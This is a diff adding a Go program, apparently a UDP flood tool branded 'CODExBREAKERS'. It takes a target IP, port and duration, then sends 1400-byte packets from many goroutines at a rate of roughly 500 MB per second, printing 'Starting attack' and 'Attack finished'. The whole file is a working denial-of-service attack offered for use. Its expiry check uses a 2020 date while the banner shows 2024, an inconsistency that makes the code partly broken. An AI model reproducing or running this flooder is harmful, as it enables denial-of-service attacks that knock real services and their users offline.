@@ -1,0 +1,206 @@
+package main 
+
+import ( 
+"fmt" 
+"log" 
+"math/rand" 
+"net" 
+"os" 
+"os/signal" 
+"strconv" 
+"sync" 
+"syscall" 
+"time" 
+) 
+
+func checkExpiry() { 
+currentDate := time.Now() 
+expiryDate := time.Date(2020, time.June, 11, 23, 0, 0, 0, time.Local) 
+
+if currentDate.After(expiryDate) { 
+  fmt.Println("This script has expired. Please contact the developer for a new version.") 
+  os.Exit(1) 
+} 
+} 
+
+// Resetting UDP connection with random local port to avoid port reuse issues 
+func resetConnection(ip, port string) (net.Conn, error) { 
+localAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%d", rand.Intn(65535-1024)+1024)) 
+if err != nil { 
+  log.Printf("Error resolving local address: %v\n", err) 
+  return nil, err 
+} 
+remoteAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%s", ip, port)) 
+if err != nil { 
+  log.Printf("Error resolving remote address: %v\n", err) 
+  return nil, err 
+} 
+conn, err := net.DialUDP("udp", localAddr, remoteAddr) 
+if err != nil { 
+  log.Printf("Error creating UDP connection: %v\n", err) 
+  return nil, err 
+} 
+return conn, nil 
+} 
+
+// Packet sending with improved error handling and periodic connection reset 
+func sendUDPPackets(ip string, port string, packetsPerSecond int, chunkDuration time.Duration, wg *sync.WaitGroup, done chan struct{}) { 
+defer wg.Done() 
+
+packet := make([]byte, 1400) // Packet size 
+interval := time.Second / time.Duration(packetsPerSecond) 
+deadline := time.Now().Add(chunkDuration) 
+
+conn, err := resetConnection(ip, port) 
+if err != nil { 
+  return 
+} 
+defer conn.Close() 
+
+ticker := time.NewTicker(interval) 
+defer ticker.Stop() 
+
+backoff := 0 
+maxBackoff := 5 // Limit the backoff to 5 seconds 
+
+// Periodically reset the connection to avoid issues 
+resetPeriod := time.Second * 30 // Reset connection every 30 seconds to prevent failure 
+lastReset := time.Now() 
+
+for time.Now().Before(deadline) { 
+  select { 
+  case <-done: 
+   return 
+  case <-ticker.C: 
+   _, err := conn.Write(packet) 
+   if err != nil { 
+    log.Printf("Error sending UDP packet: %v\n", err) 
+    backoff++ 
+    if backoff > maxBackoff { 
+     backoff = maxBackoff 
+    } 
+    time.Sleep(time.Second * time.Duration(backoff)) // Exponential backoff capped at maxBackoff 
+    continue 
+   } 
+   backoff = 0 
+
+   // Periodic connection reset 
+   if time.Since(lastReset) >= resetPeriod { 
+    conn.Close() 
+    conn, err = resetConnection(ip, port) 
+    if err != nil { 
+     log.Printf("Error resetting connection: %v\n", err) 
+     return 
+    } 
+    lastReset = time.Now() 
+   } 
+  } 
+} 
+} 
+
+// Countdown timer for visual feedback 
+func countdown(chunkDuration time.Duration, done chan struct{}) { 
+timer := time.NewTimer(chunkDuration) 
+ticker := time.NewTicker(100 * time.Millisecond) 
+defer ticker.Stop() 
+
+colorReset := "\033[0m" 
+
+for { 
+  select { 
+  case <-timer.C: 
+   return 
+  case <-ticker.C: 
+   chunkDuration -= 100 * time.Millisecond 
+   fmt.Printf("\rTime remaining: %v%s", chunkDuration.Round(time.Second), colorReset) 
+  case <-done: 
+   timer.Stop() 
+   fmt.Println("\rAttack interrupted.") 
+   return 
+  } 
+} 
+} 
+
+func main() { 
+checkExpiry() 
+
+if len(os.Args) != 4 { 
+  fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>") 
+  return 
+} 
+
+targetIP := os.Args[1] 
+targetPort := os.Args[2] 
+duration, err := strconv.Atoi(os.Args[3]) 
+if err != nil || duration <= 0 { 
+  log.Printf("Invalid attack duration: %v\n", err) 
+  return 
+} 
+totalDuration := time.Duration(duration) * time.Second 
+
+packetSize := 1400 
+packetsPerSecond := 500_000_000 / packetSize 
+numThreads := max(1, packetsPerSecond/25_000) 
+
+colorBlue := "\033[34m" 
+colorPurple := "\033[35m" 
+colorReset := "\033[0m" 
+
+fmt.Println(colorBlue + "THIS SCRIPT IS OWNED BY CODExBREAKERS" + colorReset)
+fmt.Printf("%sScript Expiry Date: %s%s\n", colorPurple, time.Date(2024, time.June, 11, 23, 0, 0, 0, time.Local).Format("2006-01-02 15:04:05"), colorReset) 
+ fmt.Printf("Starting attack on IP %s\nPORT %s\nTOTAL TIME %d seconds\nTHREADS %d\n", targetIP,
+
+targetPort, duration, numThreads) 
+ 
+ var wg sync.WaitGroup 
+ done := make(chan struct{}) 
+ 
+ signalChan := make(chan os.Signal, 1) 
+ signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM) 
+ go func() { 
+  <-signalChan 
+  close(done) 
+ }() 
+ 
+ chunkDuration := time.Second * 200 
+ chunks := int(totalDuration / chunkDuration) 
+ if totalDuration%chunkDuration != 0 { 
+  chunks++ 
+ } 
+ 
+ for i := 0; i < chunks; i++ { 
+  if i > 0 { 
+   fmt.Println("\nPausing for 500ms between chunks...") 
+   time.Sleep(500 * time.Millisecond) 
+  } 
+ 
+  currentChunkDuration := chunkDuration 
+  if i == chunks-1 { 
+   remainingDuration := totalDuration - (time.Duration(i) * chunkDuration) 
+   if remainingDuration < chunkDuration { 
+    currentChunkDuration = remainingDuration 
+   } 
+  } 
+ 
+  fmt.Printf("\nStarting chunk %d/%d with duration: %v\n", i+1, chunks, currentChunkDuration) 
+ 
+  go countdown(currentChunkDuration, done) 
+ 
+  for j := 0; j < numThreads; j++ { 
+   wg.Add(1) 
+   go sendUDPPackets(targetIP, targetPort, packetsPerSecond/numThreads, currentChunkDuration, &wg, done) 
+  } 
+ 
+  wg.Wait() 
+ } 
+ 
+ fmt.Println("\033[31mAttack finished\033[0m") 
+ fmt.Println("\033[31mSCRIPT CODED BY harry 111\033[0m") 
+} 
+ 
+func max(x, y int) int { 
+ if x > y { 
+  return x 
+ } 
+ return y 
+}
